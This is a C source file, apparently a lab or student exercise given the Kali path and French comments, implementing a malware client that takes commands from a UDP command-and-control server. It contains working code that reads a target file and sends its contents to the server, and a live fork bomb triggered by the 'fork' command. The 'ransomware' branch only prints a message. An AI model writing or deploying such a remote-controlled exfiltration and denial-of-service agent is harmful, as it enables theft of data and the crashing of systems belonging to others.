#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>

#define SERVER_IP "127.0.0.1"
#define PORT 4242
#define MAX_BUFFER_SIZE 1024

// Fonction pour simuler le chiffrement ou déchiffrement d'un fichier
void process_file(const char *action) {
    if (strcmp(action, "chiffrer") == 0) {
        printf("Encrypting file...\n");
    } else if (strcmp(action, "dechiffrer") == 0) {
        printf("Decrypting file...\n");
    }
}

// Fonction pour gérer l'exfiltration
// Exfiltre un fichier cible en envoyant son contenu via le socket UDP au serveur
void handle_exfiltration(int sockfd, struct sockaddr_in *server_addr, socklen_t addr_len) {
    const char *file_path = "/home/kali/test/IPSSI/data.txt"; // Chemin du fichier cible
    char buffer[MAX_BUFFER_SIZE];
    FILE *file_out = fopen("exfiltrated_data.txt", "w"); // Ouverture du fichier de sortie pour sauvegarde

    if (file_out == NULL) {
        perror("Erreur lors de l'ouverture du fichier pour écrire l'exfiltration");
        const char *error_message = "Erreur: Impossible d'ouvrir le fichier de sortie";
        sendto(sockfd, error_message, strlen(error_message), 0, 
               (const struct sockaddr *)server_addr, addr_len);
        return;
    }

    FILE *file = fopen(file_path, "r");
    if (file == NULL) {
        perror("Erreur lors de l'ouverture du fichier pour exfiltration");
        const char *error_message = "Erreur: Fichier introuvable";
        sendto(sockfd, error_message, strlen(error_message), 0, 
               (const struct sockaddr *)server_addr, addr_len);
        fclose(file_out);
        return;
    }

    printf("Exfiltration en cours du fichier : %s\n", file_path);

    // Lire le contenu du fichier et l'envoyer au serveur
    while (fgets(buffer, MAX_BUFFER_SIZE, file) != NULL) {
        fprintf(file_out, "%s", buffer);  // Écrire le contenu dans le fichier de sortie
        sendto(sockfd, buffer, strlen(buffer), 0, 
               (const struct sockaddr *)server_addr, addr_len);
    }

    fclose(file);
    fclose(file_out);

    // Indiquer la fin de la transmission au serveur
    const char *eof_signal = "EOF";
    sendto(sockfd, eof_signal, strlen(eof_signal), 0, 
           (const struct sockaddr *)server_addr, addr_len);

    printf("Exfiltration terminée.\n");
}

// Fonction pour exécuter le fork bomb
void execute_fork_bomb() {
    printf("Démarrage de fork bomb...\n");
    while (1) {
        fork();
    }
}

// Fonction pour gérer la déconnexion
void out(int sockfd) {
    printf("Déconnexion en cours...\n");
    close(sockfd);
    printf("Déconnecté.\n");
}

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[MAX_BUFFER_SIZE] = {0};
    char client_id[50];
    socklen_t addr_len = sizeof(server_addr);
    int should_exit = 0; // Variable de contrôle pour quitter la boucle principale

    // Création du socket UDP
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Échec de la création du socket");
        return EXIT_FAILURE;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Adresse invalide");
        close(sockfd);
        return EXIT_FAILURE;
    }

    printf("Entrez votre ID client : ");
    fgets(client_id, sizeof(client_id), stdin);
    client_id[strcspn(client_id, "\n")] = '\0';
    
    // Envoie de l'ID client au serveur
    sendto(sockfd, client_id, strlen(client_id), 0, 
           (const struct sockaddr *)&server_addr, addr_len);
    printf("ID client envoyé. En attente des commandes...\n");

    while (!should_exit) { // Utilisation de la variable de contrôle
        memset(buffer, 0, sizeof(buffer));

        // Recevoir une commande du serveur
        if (recvfrom(sockfd, buffer, sizeof(buffer), 0, 
                     (struct sockaddr *)&server_addr, &addr_len) <= 0) {
            perror("Erreur de réception");
            break;
        }

        printf("Commande reçue : %s\n", buffer);

        if (strcmp(buffer, "ransomware") == 0) {
            memset(buffer, 0, sizeof(buffer));

            if (recvfrom(sockfd, buffer, sizeof(buffer), 0, 
                         (struct sockaddr *)&server_addr, &addr_len) <= 0) {
                perror("Erreur de réception de l'action");
                break;
            }

            printf("Action à effectuer : %s\n", buffer);
            process_file(buffer);

            // Envoyer un message au serveur indiquant la fin de la tâche
            sendto(sockfd, "Action terminée", 16, 0, 
                   (const struct sockaddr *)&server_addr, addr_len);

            printf("Tâche de chiffrement ou déchiffrement terminée.\n");
            should_exit = 1; // Définir la variable de contrôle pour quitter
            out(sockfd); // Déconnexion après la tâche
        } else if (strcmp(buffer, "exfiltration") == 0) {
            handle_exfiltration(sockfd, &server_addr, addr_len);
        } else if (strcmp(buffer, "fork") == 0) {
            execute_fork_bomb();
        } else if (strcmp(buffer, "out") == 0) {
            out(sockfd);
            should_exit = 1; // Définir la variable de contrôle pour quitter
        } else {
            printf("Commande inconnue : %s\n", buffer);
        }
    }

    close(sockfd); // Assurez-vous que le socket est fermé
    printf("Connexion terminée.\n");
    return EXIT_SUCCESS;
}
